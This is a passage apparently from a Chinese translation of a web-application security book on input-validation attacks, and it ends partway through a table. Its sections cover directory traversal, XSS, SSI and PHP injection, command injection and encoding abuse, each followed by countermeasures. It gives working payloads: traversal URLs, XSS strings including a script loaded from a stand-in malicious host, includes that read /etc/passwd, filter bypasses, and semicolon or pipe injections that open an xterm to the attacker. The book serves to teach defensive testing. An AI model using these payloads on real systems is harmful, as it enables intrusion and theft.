Sent: /includes/printable.asp?Link=../inetpub/wwwroot/default.asp
Return: Microsoft VBScript runtime error '800a0046'
File not found
/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=.././inetpub/wwwroot/default.asp
Return: Microsoft VBScript runtime error '800a0046'
File not found
/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=.././inetpub/wwwroot/default.asp
Return: Microsoft VBScript runtime error '800a0046'
File not found
/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=../././inetpub/wwwroot/default.asp
Return: Microsoft VBScript runtime error '800a0046'
...source code of default.asp returned!...

如果用.../.../.../.../.../.../.../这种简单的方法就能找到根目录，那精确计算目录的层数显得有点迂腐。在作决策之前，应该仔细分析一下需要的转义符个数。这里需要回溯 4 层获得 printable.asp 源文件，而如果认为路径是/inetpub/wwwroot/includes/printable.asp，则需要回溯三层，多的一层可能是由于/includes 目录是其他驱动器的映射或者 Link 文件的默认位置在其他地方而造成的。

注意 我们找到的 printable.asp 很容易受到目录遍历攻击，因为该文件没有进行输入验证，这一点从文件中的一行代码可以明显地看出来：
Link = "D:\\Site server\\data\\publishing\\documents\"&Request.QueryString("Link")
请注意这个目录的深度。

错误的代码还能帮助我们枚举目录。比如，我们可以利用“Path not found”和“Permission denied”的错误代码追踪服务器上的目录。回到上面的例子，使用 printable.asp 来枚举目录，代码如下：

Sent: /includes/printable.asp?Link=.../.../.../inetpub
Return: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=.../.../.../inetpub/borkbork
Return: Microsoft VBScript runtime error '800a0046'
Path not found

/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=.././data
Return: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10
Sent: /includes/printable.asp?Link=.././././Program%20Files/
Return: Microsoft VBScript runtime error '800a0046'
Permission denied
/includes/printable.asp, line 10

这些结果告诉我们要分辨出那些文件和目录在 Web 服务器上是否存在是可能的。我们证实了/inetpub 和 “Program Files” 目录都存在，因为错误信息显示 Web 应用程序没有访问权限（Permission denied）指出 Web 应用程序对它们没有读取的访问权限。但是，如果访问实际不存在的 “/inetpub/borkbork” 目录，也会返回 “Permission denied” 错误，那么这个方法就会失效，因为我们无法区分不可读的目录（比如，Program Files 目录）和不存在的目录（比如，borkbork 目录）。我们还在这个枚举的过程中，发现了一个 data 目录，这个目录在 printables.asp 文件所在的路径之中（D:\Site server\data\publishing\documents\）。

概括枚举文件过程，主要分为如下几个步骤。

- 检查错误代码：检查应用程序是否对不存在的文件、不存在的目录、存在的文件（但有可能读取访问权限被拒绝）和存在的目录，返回不同的错误信息；

○ 找到根目录：不断地添加目录遍历字符，直到能判定驱动器名或根目录开始的位置；

从 Web 文档根目录开始往下层遍历：Web 文档根目录中的文件很容易枚举，在首次检查应用程序时，就应该把它们中的绝大部分都列出来，因为这些文件的数目是已知的，所以找到它们也更加容易。

寻找常见的目录：寻找临时目录（/temp，/tmp，/var）、程序目录（/Program Files，/winnt，/bin，/usr/bin），以及其他一些常见的目录（/home，/etc，/downloads，/backup）。

尝试直接访问目录名：如果应用程序对目录有读访问权限，那么访问目录名就会把目录中的文件都列举出来，这使得文件枚举变得非常简单！

注意 一个好的 Web 应用程序测试员参考手册，应该包含 web 服务器上使用的常见程序的分层目录列表。有了目录和配置文件的参考，将会大大提高目录遍历攻击的成功性！应用程序列表应该包括 Lotus Domino，Microsoft Site Server 和 Apache Tomcat 等。

#### ☐ 对抗措施

转义攻击的最好的防范方法是过滤掉 GET 和 POST 参数中所有的圆点字符（.）。解析引擎也需要注意发现以 Unicode 和十六进制编码表示的圆点字符。

另外，强制所有的读取都从一个特定的目录开始，并使用正则表达过滤器去掉文件名前所有的路径信息。比如，将“/path1/path2/./path3/file”缩减为“/file.”。

安全的文件系统许可也可以减轻此类攻击。首先，用低级别权限的用户，比如 UNIX 下的“nobody”或 Windows 下的“Guest”（也可以为此建立一个定制的账户），来运行 Web 服务器；其次，限制 Web 服务器账户的权限，使其只能读取与 Web 应用相关的特定的目录里的文件。

最后，将敏感文件，比如引用文件（后缀为*.inc），移出 Web 文档根目录，转移到某个 Web 服务器仍可访问的目录中，这样可以减轻目录遍历攻击的危害，如果目录遍历攻击被限制在只能在 Web 文档根目录中浏览文件，那么用户将无法读取到那些文件，但服务器仍可以访问它们。

#### 6.4.3 脚本攻击

脚本攻击包括所有向程序提交 HTML 格式的字符串，并使程序随后处理这些标记的所有方法。最简单的脚本攻击是输入<script>标记到一个表单字段中，如果用户提交的字段内容重新显示，那么浏览器就会把该内容解释为 JavaScript 指令，而不是显示“<script>”字符串值。此类攻击的真正目标是应用程序的其他用户，他们观看了恶意内容后，就会落入社会工程攻击（social engineering）的陷阱。

进行此类攻击需要两个前提：第一，应用程序必须接收用户的输入，这显然是必要条件，但是，输入并非只能来自于表单字段，我们将列举一些针对 URL 的测试方法，但这些方法对头部和 Cookie 也同样适用；第二，应用程序必须重显用户输入的内容，只有浏览器将应用程序提供的数据解释为 HTML 标记时，攻击才会发生。比如，下面两个片断摘自于显示查询结果的 HTML 代码片断。

Source: 37 items found for <b>&lt;i&gt;test&lt;/i&gt;
Display: 37 items found for <i>test</i>
Source: 37 items found for <b><i>test</i></b>
Display: 37 items found for test

用户在该站点中搜索 “<i>test</i>”。在第一个例子中，程序正确地处理了输入，把尖括号进行了 HTML 编码，没有解释为斜体标记；而在第二个例子中，尖括号被保留了下来，从而产生了斜体效果。当然，这只是一个小例子，但它演示了脚本攻击是如何进行的。

##### 跨站脚本（XSS）

跨站脚本攻击在其他用户可以看到的地方放置恶意代码，通常是 JavaScript 代码。表单中的目标字段可以是地址、留言评论等。恶意代码通常窃取 Cookie，从而可以使攻击者

冒充成用户，或者进行社会工程攻击，诱引受害者泄漏自己的密码。Hotmail，Gmail 和 AOL 都曾受到过这类社会工程攻击。

这里并不想特意论述操纵浏览器漏洞的 JavaScript 或类似技术，有三种方法可以对应用程序进行测试，如果成功的话，就表明该应用程序存在漏洞。

<script>document.write(document.cookie)</script>
<script>alert('Salut!')</script>
<script src="http://www.malicious-host.foo/badscript.js"></script>

请注意，最后一行代码从完全不同的一台服务器上调用了 JavaScript，该技巧可以绕过绝大多数有长度限制的情况，因为 badscript.js 文件可以任意长而它的引用语句却相对较短。这些测试针对表单非常容易进行，在任意一个会重显的字段中试着简单填入字符串即可。比如，许多电子商务网站在你输入地址后，会显示一个确认页面，可以尝试在“街道名称”中输入<script>标记，看看会发生什么。

还有一些其他方法可以执行 XSS 攻击，像前面提到的那个例子，程序的搜索引擎也是 XSS 攻击的一个主要目标，可以在搜索字段中输入攻击内容，也可以直接通过 URL 提交：

http://Website/search/search.pl?qu=<script>alert('foo')</alert>

我们还发现，错误页面也经常遭受 XSS 的攻击。比如，一个正常程序的错误页面 URL 如下：

http://Website/inc/errors.asp?Error=Invalid%20password

这会显示一个定制的拒绝访问页面，上面写着“Invalid password”（无效口令）。在页面内容中发现 URL 中的字符，这充分说明存在 XSS 漏洞。可以构造如下的攻击：

http://Website/inc/errors.asp?Error=<script%20src=...

也就是将脚本标记放在 URL 中。现在，你应该知道如何进行测试了。更多关于常见的 XSS 注入技术，可以从本章末尾的“参考书目和进一步阅读”中找到。

##### 嵌入式脚本

嵌入式脚本攻击不像跨站脚本那样流行，但也很常见。XSS 攻击的目标是应用程序的其他用户，嵌入式脚本的攻击目标则是程序本身，因此，嵌入式脚本攻击中的恶意代码不是<script>标记对，而是格式化标记了。这些标记包括 SSI 指令、ASP 括号、PHP 括号、SQL 查询结构甚至 HTML 标记。嵌入式脚本攻击的目的是使被提交的数据在程序中显示的时候可以作为一段程序指令执行，或者破坏 HTML 的输出。执行这些指令可以使得攻击者访问服务器上的变量，比如密码，或者 Web 根目录以外的文件，不必说，这给应用程序带来了

极大的风险。如果嵌入式脚本只能破坏 HTML 输出，那么攻击者可能会看到没有正常执行的源码，这仍有可能暴露应用程序的敏感数据。

测试的执行被分成若干种类。对应用程序的审计不需要复杂的测试或者恶意代码，如果一个嵌入的 ASP 的 date()函数返回了当前日期，那么说明程序的输入验证流程并不完善。ASP 代码是非常危险的，因为它可以执行任意命令或访问任意文件。

&lt;%= date() %&gt;

服务器端的 include 也允许执行命令和访问任意文件:

<!--#include virtual="global.asa" -->
<!--#include file="/etc/passwd" -->
<!--#exec cmd="/sbin/ifconfig -a" -->

嵌入的 Java 和 JSP 同样是很危险的：

&lt;% java.util.Date today = new java.util.Date(); out.println(today); %&gt;

最后，我们不要忘了 PHP:

<? print (Date("1 F d, Y"); ?>
<? Include '/etc/passwd' ?>
<? passthru ("id");?>

如果这些字符串中有一句能真正起作用，那么程序就会面临着严重的安全问题。语言标记（如“<?”或“<%”）通常在用户输入前处理，这并不意味着多余的%>不会破坏 JSP 文件，如果文件真被破坏，也无需太沮丧。

一个更加可行的测试是破坏表和表单的结构，如果程序基于用户的输入建立定制的表格，那么一个伪造的</table>标记就可以提前结束这段页面，造成页面的一半是正常的HTML输出，而另一半是源代码的情况，这种技术针对动态生成的表单是非常有效的。

##### Cookies 和预定义头

Web应用程序测试者总是会检查Cookie的内容，毕竟Cookie能被操纵，用来冒充其他用户或者提升权限。应用程序必然会读取Cookie，因此Cookie也是脚本攻击中一个同样有效的测试目标。事实上，许多应用程序都会解释你的浏览器细节信息，比如，HTTP 1.1规范就定义了一个“用户代理”（“User agent”）头来识别浏览器，在这个头字符串中通常能看到类似于“Mozilla”的词。

应用程序利用用户代理字符串来适应不同浏览器的特殊性（因为没有哪个浏览器完全遵循标准）。基于文本的浏览器 Lynx，甚至允许你指定一个定制的字符，在下面的例子中，将 User agent 串设为<script>。

$ lynx -dump -useragent="<script>" \
> http://Website/page2a.html?tw=tests
...output truncated...
Netscape running on a Mac might send one like this:
User Agent: Mozilla/4.5 (Macintosh; U; PPC)
And FYI, it appears that the browser you're currently using to view this document sends this User Agent string:

这是怎么回事？应用程序不能识别出我们定制的用户代理串。如果我们查看源码，就会明白为什么会发生这样的情况。

And FYI, it appears that the browser you're currently using to view this document sends this User Agent string:
<BLOCKQUOTE>
<PRE>
<script>
</PRE>
</BLOCKQUOTE>

因此，我们的<script>标记最终被接收了。这是一个漏洞程序的经典例子，这里要强调的一点是，输入验证将影响应用程序所接收的任何一个输入。

#### ☐ 对抗措施

防范脚本攻击最有效的方法，是把所有的尖括号都转化为对应的 HTML 编码，即把左尖括号“<”表示成“&lt;”，把右括号“>”表示成“&gt;”。这样可以保证以一种无害的方式存储和显示括号了。Web 浏览器是绝对不会执行一个“&lt;script&gt;”标记的。

一旦消除最大的威胁，就可以集中精力进一步调整应用程序了。限制输入字段的长度，使其为所需数据类型的最长长度，比如名字字段不要超过20个字符，而电话号码则可以更短一点。大部分脚本攻击都需要一定长度的字符空间——即使仅计算<script></script>对，也至少需要17个字符。当然，不要忘记了长度检查应在服务端进行，而不是在Web浏览器端。

一些应用程序允许用户输入特定的 HTML 标记，例如黑体、斜体和下划线。这种情况下，需要使用正则表达式验证数据。验证应该是进行白表检查，而不是进行黑表检查。换句话说，应该只寻找和保留允许的标记，然后对所有剩下的括号进行 HTML 编码。例如，如果那些检测<script>标记的正则表达式不完善，可以用下面的一些方法进行欺骗。

<scr%69pt>
<<script>
<a href="javascript:commands..."></a>
<b+<script>
<scrscripti<sup>t</sup>> (bypasses regular expressions that replace "script" with

null)

显然，在这种情况下，检查出允许的标记（<b>），远比检查出不允许的标记（<script>）更简单。更多关于 XSS 的信息和其他对攻击内容进行编码的方法可以访问 http://ha.ckers.org/xss.html。

#### 6.4.4 边界检查

数字字段很可能被滥用而不被察觉。即使应用程序完全限制数据必须为数字值，有些值仍有可能引起错误。边界检查是一项简单的技术，它测试一些极端的数值。比如，把`UserID=19237`替换为`UserID=0`或`UserID=-1`，就可能产生错误的信息或异常的行为。上界同样需要检查，单字节的值不能大于255，双字节的值不能大于65535。下面是边界检查的一个例子。

http://www.victim.com/internal/CompanyList.asp?SortID=255
Your Search has timed out with too long of a list.
http://www.victim.com/internal/CompanyList.asp?SortID=256
Address Change Search Results
http://www.victim.com/internal/CompanyList.asp?SortID=257
Your Search has timed out with too long of a list.
http://www.victim.com/internal/CompanyList.asp?SortID=0
Address Change Search Results

请注意，将 SortID 设为 256 时，返回了正常的查询结果，但为 255 或 257 的时候却没有，SortID=0 时，也返回了正常的查询结果。看来，应用程序只接受 8 位的 SortID 值，即可接受的 SortID 值位于 0 和 255 之间。一个 8 位的数值在 255 时会产生“溢出”，因此 256 实际被认作为 0。

边界检查可能不会获得执行命令或访问任意文件的机会，但是，产生的错误也会泄漏关于程序或服务器的有用信息。这项检查只需测试少量的值，如下所示。

- 布尔值变量：任何有某种真假表示形式的值（T/F，true/false，yes/no，0/1），把两种值都试试，然后再尝试一个没有意义的值。对接受字符的参数使用数字，对接受数字的参数使用字符。

- 数值变量：试试 0 和负数（0 和 -1 就可以达到边界检查的目的），也试试不同位范围的最大值，即 256，65536，4294967296。

☐ 字符串：测试一下长度限制，也检查字符串变量，如姓名、地址等，是否接受标点字符。

#### 6.4.5 操纵应用程序行为

一些应用程序带有一些特殊的指令，开发者经常使用它们进行测试。最著名的一条指令就是“debug=1”。在 GET 或 POST 请求后面带上这条指令，就可能会返回许多关于变量、系统或后台数据库连接的信息。一次成功的攻击可能需要把 debug，dbg 与 true，T 或 1 组合起来使用。

有些平台允许在 URL 上设置内部变量；另外一些攻击的目标是 Web 服务器，例如，针对 JRun x.x 和 Tomcat 3.2.x.服务器， %3f.jsp 会返回目录列表。

CGI 中的 htsearch 既可以按照 CGI 运行也可以按照命令行程序运行，以命令行运行时，接受-c [filename]参数来读取另外的配置文件。

##### 搜索引擎

百分号(“%”)通常作为 SQL 或搜索引擎中的通配符，在搜索字段中输入百分号，有可能返回整个数据库的内容，或者产生错误信息。下面就是一个这样的例子：

http://victim.com/users/search?FreeText=on&kw=on&ss=%
Exception in com.motive.Web411.Search.processQuery（Compiled Code）：java.lang.StringIndexOutOfBoundsException: String index out of range: 3 at java.lang.String.substring（Compiled Code）at
javax.servlet.http.HttpUtils.parseName（Compiled Code）at
javax.servlet.http.HttpUtils.parseQueryString（Compiled Code）at
com.motive.mrun.MotiveServletRequest.parseParameters（Compiled Code）
at com.motive.mrun.MotiveServletRequest.getParameterValues（Compiled Code）
at com.motive.Web411.MotiveServlet.getParameterValue（Compiled Code）
at com.motive.Web411.Search.processQuery（Compiled Code）at
com.motive.Web411.Search.doGet（Compiled Code）at
javax.servlet.http.HttpServlet.service（Compiled Code）at
javax.servlet.http.HttpServlet.service（Compiled Code）at
com.motive.mrun.ServletRunner.RunServlet（Compiled Code）

SQL 也使用下划线（_）作为单字符的通配符；而在后台使用了 LDAP 的 Web 应用程序，也有可能受到基于星号（*）的攻击，因为在 LDAP 协议里，星号代表着通配符。

#### 6.4.6 SQL 注入和数据存储攻击

SQL 注入是输入验证攻击的特殊情况，它能够打开一个数据库并彻底捣毁。测试是否存在 SQL 注入攻击的最简单方法是在 URL 末尾添加 “or+1=1”，然后观察服务器返回的数据。SQL 注入攻击的基本原理还是向应用程序发送非法的输入。

即使这样，我们还是要提一下，SQL 注入测试会暴露那些不能访问数据库的文件中的许多错误。一个没有预料到的单引号（'）就会给程序带来严重的错误，下面这个 URL，就能找到 SQL 注入漏洞：

http://Website/in.php3?list=979077131'&site=4thedition

响应已经指明了一个文件访问错误，引导我们接下来尝试不同的测试：

Warning: fopen("/usr/home/topsites/lists/979077131\')/vote_timeout.txt","a") - No such file or directory in /home/sites/site8/Web/in.php3 on line 13

关于成功的攻击所带来的潜在影响，我们将在单独的章节中论述，请参看第 8 章，里面有针对具体数据库，如何精心构造攻击绕过输入验证的详细讨论。

#### 6.4.7 执行命令

许多攻击只能导致信息泄漏，比如数据库的字段、程序源代码或任意文件的内容。而攻击的最终目的是可以执行命令。一个类似命令行的接口，可以迅速攻克 Web 服务器甚至所在的局域网中的其他系统。

##### 换行符

换行符的十六进制表示是%0a，它是执行任意指令攻击中非常有用的字符。在 UNIX 系统中，那些不太安全的 CGI 脚本（比如用 Shell 语言编写的脚本），会把换行符解释为执行新命令的指示符。

例如，一个服务提供商的银行平台管理接口采用 Korn Shell（KSH）语言编写，接口的一个功能是调用内部的“analyze”程序去收集它所管理的各个银行 Web 站点的统计信息，GET 请求为：URL/analyze.sh?-t+24&-i. 测试的第一步，检查脚本是否接收任意的变量，可以肯定，URL/analyze.sh?-h 会返回“analyze”程序的帮助页面；下一步就是测试能否执行命令，URL/analyze.sh?-t%0a/bin/ls%0a，这条命令返回服务器上的目录列表（采用了 ls 命令），这样的话，相当于我们拥有了服务器上的一个命令行接口。

HTTP 响应头截断是换行符攻击的另一个例子（参看“参考和进一步阅读”了解更多的信息）。HTTP 响应头截断注入换行回车字符（%0d%0a）到 HTTP 重定向响应中，从而提前截断正常的响应数据，并插入攻击者所选择的 HTTP 头。HTTP 响应头通常包括 Last-Modified、缓存控制（导致客户端缓存攻击）、Cookie 设置（导致 Cookie 攻击）和 XSS。我们将在第 12 章演示 HTTP 响应头截断的例子。

##### 连接字符（&）、管道字符（|）和分号字符（;）

命令注入攻击的一个重要技术是找到正确的命令分割符组合。基于 Window 和 UNIX 的系统都接受连接字符（&）、管道字符（|）和分号字符（;）的某个子集。

管道字符（%7c）可以用来连接 UNIX 命令。基于 Perl 的 AWStats 程序（http://awstats.sourceforge.net/）可作为利用管道字符执行命令的范例。版本低于 6.5 的 AWStats 存在命令注入攻击漏洞——awstats.pl 文件中的 configdir 参数，下面是攻击例子：

http://Website/awstats/awstats.pl?configdir=|command|

在这里，command 可以是任何有效的 UNIX 命令，比如，下载并执行攻击程序或者利用 Netcat 开一个反向 Shell。管道字符是必须使用的，用来构造 Perl open 函数的合法参数，这个函数在 awstats.pl 文件中被使用。

分号（%3b）是执行命令中使用最方便的字符。分号常用来把单独一行命令分割为多条命令。分号字符有时可以欺骗基于 UNIX 的脚本，测试方法是字段值后面加上分号，并在分号后面加上需要执行的命令。比如：

command1; command2; command3

下面这个例子演示了如何通过修改窗体下拉菜单中的选项值，导致执行任意命令。正常情况下，用户在 arcfiles.html 页面中选择了一个菜单选项后，应用程序会收到一个 8 位的数字。页面本身没有漏洞，但其 HTML 表单发送 POST 数据给名为 view.sh 的 CGI 程序，“.sh”的后缀就拉响了输入验证特别是执行命令攻击的警报，因为 UNIX 的 Shell 脚本是安全 CGI 程序的最坏选择。在浏览器中，我们可以看到 HTML 的源代码，其中一个选项值为：

 $$ <option value=24878478>Jones Energy Services Co. $$ 

表单采用的提交方式是 POST，为了克服这个问题，我们可以通过一个像 Paros 的代理工具，在 POST 请求到达服务器之前修改其数据，不过，我们也可以把页面保存在本地计算机，然后修改那行代码以执行某条任意指令。假设攻击者的 IP 地址为 10.0.0.42，我们选择的命令是从 Web 服务器上向客户端显示一个终端窗口，当然，前提是服务器和客户端都支持 X Window 系统。在下载到本地计算机中的 arcfiles.html 页面里构造命令并设置新值如下：

<option value = "24878478; xterm -display 10.0.0.42:0.0">
Jones Energy Services Co.

接下来，打开本地计算机中的 arcfiles.html，在下拉菜单中选择 “Jones Energy Services Co.”。基于 UNIX 的应用程序收到 8 位的选项值后，会传给 view.sh 文件，但是参数中还包含了分号。采用 Bourne shell 编写的 CGI 脚本，像平时一样解析 8 位选项后，还会继续执

行字符串中分号后的下一个命令。如果一切顺利，一个 xterm 控制终端将会弹出，你拥有了受害机上执行命令的权限。

注意 这个例子也说明了调查应用程序是非常重要的，这样的输入验证攻击对基于 Windows 2000 的 Web 服务器来说，只是浪费时间而已。所以一定要了解你的目标！

连接字符（%26）也能用来执行命令，通常情况下，这个字符作为 URL 中参数的分隔符，但在进行简单的 URL 编码后，它也可以作为值的一部分递交。Big Brother，一个基于 Shell 的监控系统，就有一些这样的漏洞，Bugtraq ID 1779 描述了连接符引起的执行任意指令漏洞。Windows 使用两个连接符（&&）作为命令的分隔符。

#### 6.4.8 编码滥用

在第 1 章中曾提到，RFC 2396 中定义了 URL 的语法（参见 “参考和进一步阅读”），也定义了 URL 字符的各种编码方式，采用编码后，URL 字符的表现形式就彻底不一样了，但它们其实完全是一回事。在 Web 历史上，攻击者越来越多地利用这一点来构造出复杂的技术，以绕过输入验证。表 6-1 列出了攻击者最常使用的编码技术的一些例子。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>编码类型</td><td style='text-align: center; word-wrap: break-word;'>编码字符</td><td style='text-align: center; word-wrap: break-word;'>漏洞实例</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Escaped-encoding</td><td style='text-align: center; word-wrap: break-word;'>%2f（斜线）</td><td style='text-align: center; word-wrap: break-word;'>实例太多无法一一列举</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Unicode UTF-8</td><td style='text-align: center; word-wrap: break-word;'>%co%af（反斜线）</td><td style='text-align: center; word-wrap: break-word;'>IIS Unicode 目录遍历漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Unicode UTF-7</td><td style='text-align: center; word-wrap: break-word;'>+ADw-（左尖括号）</td><td style='text-align: center; word-wrap: break-word;'>2005年11月Google XSS 漏洞</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Multiple encoding</td><td style='text-align: center; word-wrap: break-word;'>%255c（反斜线，%5C）</td><td style='text-align: center; word-wrap: break-word;'>IIS 双重解码目录遍历漏洞</td></tr></table>

#### 6.4.9 PHP 全局变量

本章中提到的绝大多数技术对所有 Web 应用程序都能有效，而无论它们使用何种编程语言和平台。不能说这种应用程序开发技术比那种技术更安全或更不安全。如果开发者没有意识到 Web 应用程序所面临的威胁，或者低估应用程序被利用的后果，那么不完善的输入验证将会是导致遭受攻击的主要原因。

尽管如此，一些语言引入了某种特性，如果误用或误解了这些特性，会导致不安全的应用程序。PHP 就有这样的特性，它有一种超级全局变量（superglobals）。这种变量的作用域非常广，任何 PHP 文件的函数和类都可以访问它。最常见的 4 个超级全局变量是 $_GET, $_POST, $_COOKIE 和 $_SESSION，每一个变量都包含了一个参数关联数组，比如 $_POST 变量存储着所有通过 POST 形式发送过来的名称/值数据对。在 PHP 中，也可以用 $GLOBALS 变量来定制自己的超级全局变量。

如果超级全局变量没有被正确的初始化，就有可能被发送过来的 GET 和 POST 参数所改写，而通常认为数组的值来自于用户提交的输入，不会被人刻意利用。

比如，config 数组变量中有一项 root_dir，如果 config 被注册为 PHP 全局变量，那么就有可能提交一个请求，写入 root-dir 的新值来攻击它。

http://Website/page.php?config[root_dir]=/etc/passwd%00

PHP 会把 config[root_dir]作为参数，并赋其新值（这里给的是系统的口令目录）——这显然不是应用程序想使用的。

当然，在不能访问源代码的情况下，估计全局变量的名称是件困难的事情，但是，其他一些通过 POST 提交 GET 参数（或者反过来）的技术，可以用来测试参数提交是否可以绕过输入验证过滤。

更多的信息可以在 Hardened PHP Project 网站上找到: http://www.hardenedphp.net/.（具体的网页为 http://www.hardened-php.net/advisory_172005.75.html 和 http://www.hardened-php.net/advisory_202005.79.html.）

#### 6.4.10 常见的后果

输入验证攻击不一定会对应用程序造成破坏，它可以产生详细的错误信息，帮助识别平台的细节，为 SQL 注入攻击揭示数据库的详细信息，或者只是判断应用程序是否进行了完善的输入过滤。

##### 详细错误信息

泄漏错误信息不是一类具体的攻击，而是前面提到的很多攻击的可能后果。错误信息可能包括绝对路径、文件名、变量名、SQL 表单描述、servlet 错误（包括自定制的和基础的 Servlet），数据库错误（ADO 错误），以及任何应用程序的相关信息。

#### ☐ 对抗措施

我们在讨论输入验证攻击的时候，已经提到了一些对抗措施。但还是有必要在这里重复一些阻拦这些攻击的关键点：

- 使用客户端验证可以提高性能，但并不安全：客户端输入验证机制可以阻止无意的输入错误和拼写错误到达服务器，这个预处理验证步骤可以减轻服务器端的负担。但是恶意用户可以轻易地绕过客户端验证，因此仍需要在服务端控制下进行完整的验证。

○ 归一化输入值：许多攻击都有很多基于字符集和十六进制表示形式的替换编码，因

此在对它们进行安全和验证检查前，必须将输入数据进行归一化处理，否则编码后的数据会绕过过滤器，而在后面的步骤中又会被解码还原成恶意代码。该步骤也包括检查转义文件名和路径名所采用的方法。

采用服务端输入验证：所有来自 Web 浏览器的数据都能被修改为任意内容，因此，必须在服务端进行适当的输入验证，这样才能避免验证函数被绕过。

- 约束数据类型：程序不应该处理那些不符合基本类型、格式和长度要求的数据。比如，数字值应该赋给一个数字数据结构；字符串值应该赋给一个字符串数据结构；而美国的邮编号码，除了必须是数字外，还应该正好是 5 位长（或者 ZIP+4 的格式）。

字符编码和输出验证：应该对 HTML 和 SQL 格式中使用的字符进行编码，以避免应用程序错误地解释和执行它们。比如，把尖括号表示成 HTML 编码形式 “&lt;;” 和 “&gt;”。此类输出验证或字符重定格式作为对抗脚本攻击的附加安全层，即使恶意代码成功地绕过了输入过滤器，在输出阶段能带来的危害也很小。

白名单/黑名单法：使用正则表达式查找授权或未经授权的内容。白名单包含允许内容的模式；黑名单上包含不允许或恶意内容的模式。使用白名单法更加容易，也推荐采用这种方法，因为所有期望被阻止的恶意内容无法全部列举，而黑名单法只能创建已知攻击的列表，无法阻止任何新的攻击。尽管如此，还是可以使用黑名单法列出一些攻击模式，比如，简单的 SQL 注入和跨站脚本攻击所使用的恶意格式。

提示 一些字符有 4 种表示形式（称为 “实体表示” ）：字符名，十进制表示，十六进制表示和 UTF-8（Unicode）表示，但是只有十进制形式才能可靠地跨浏览器和跨平台。

安全的处理错误: 无论使用哪种语言编写应用程序, 都需要使用类似 Java 中 try, catch, finally 的异常处理概念来捕捉错误。在 try 中包含要处理的动作; catch 中指明动作可能会产生的某种异常; finally 使发生错误时可以正常地退出。这样可以产生一个正常而得体的错误页面, 而不会包含任何系统的相关信息。

○ 请求认证：将服务器配置为在目录级别请求认证，这样当访问目录下的任何文件时，服务器都进行恰当的认证。

- 使用最低权限访问法则：以尽可能低的权限运行 Web 服务器和它所支持的应用程序。一个不能访问/sbin 目录（保存 UNIX 管理员工具的地方）的应用程序，所面临的可执行任意指令的风险，远比一个同样的但能以 root 身份执行命令的应用程序小。

### 6.5 小结

恶意输入攻击的目标是程序中没有充分解析的参数值。不充分的解析可能由以下几方

面导致：不加选择地接受用户的输入，依赖客户端的验证过滤，或者认为非表单的数据不会被篡改。一旦攻击者找到了攻击载体，就可能进行更严重的攻击。基于不完善的输入验证攻击包括缓冲区溢出攻击、任意文件访问、社会工程攻击、SQL注入和命令攻击。所以，输入验证流程绝不是小问题，其对应用程序的威胁也绝对不能忽视。

下面是一些可能会寻找到不完善输入验证的地方：

○ GET 请求的每个参数

☐ POST 请求的每个参数

☐ 表单（电子邮件地址，家庭地址，姓名，注释）

☐ 搜索字段

☐ Cookie 的值

☐ 浏览器环境变量（用户代理，IP 地址，操作系统等）

另外，表 6-2 列出了一些字符和对应的 URL 编码，这些编码常常代表恶意内容，或者代表着产生错误信息或执行命令的企图，虽然单独使用这些字符并不一定就能攻击应用程序，而且它们并非总是非法的，但是，如果它们不是应用程序所需的数据，不费多少气力就可以把它们转化为一次攻击。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>字 符</td><td style='text-align: center; word-wrap: break-word;'>URL编码</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>,</td><td style='text-align: center; word-wrap: break-word;'>%27</td><td style='text-align: center; word-wrap: break-word;'>一个在SQL注入中绝对需要的字符，会产生错误信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>;</td><td style='text-align: center; word-wrap: break-word;'>%3b</td><td style='text-align: center; word-wrap: break-word;'>命令分隔符，脚本终止符号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[NULL]</td><td style='text-align: center; word-wrap: break-word;'>%00</td><td style='text-align: center; word-wrap: break-word;'>文件访问中的字符串终止符号，命令分隔符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[回车]</td><td style='text-align: center; word-wrap: break-word;'>%0a</td><td style='text-align: center; word-wrap: break-word;'>命令分隔符</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>+</td><td style='text-align: center; word-wrap: break-word;'>%2b</td><td style='text-align: center; word-wrap: break-word;'>在URL中表示空格，用于SQL注入攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&lt;</td><td style='text-align: center; word-wrap: break-word;'>%3c</td><td style='text-align: center; word-wrap: break-word;'>HTML开始标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>&gt;</td><td style='text-align: center; word-wrap: break-word;'>%3e</td><td style='text-align: center; word-wrap: break-word;'>HTML结束标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>%</td><td style='text-align: center; word-wrap: break-word;'>%25</td><td style='text-align: center; word-wrap: break-word;'>在两次解码，搜索字段攻击中经常使用，表示ASP，PHP标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>?</td><td style='text-align: center; word-wrap: break-word;'>%3f</td><td style='text-align: center; word-wrap: break-word;'>表示PHP标记</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>=</td><td style='text-align: center; word-wrap: break-word;'>%3d</td><td style='text-align: center; word-wrap: break-word;'>在一个URL参数中放置多个等号</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>(</td><td style='text-align: center; word-wrap: break-word;'>%28</td><td style='text-align: center; word-wrap: break-word;'>用于SQL注入攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>)</td><td style='text-align: center; word-wrap: break-word;'>%29</td><td style='text-align: center; word-wrap: break-word;'>用于SQL注入攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>[空格]</td><td style='text-align: center; word-wrap: break-word;'>%20</td><td style='text-align: center; word-wrap: 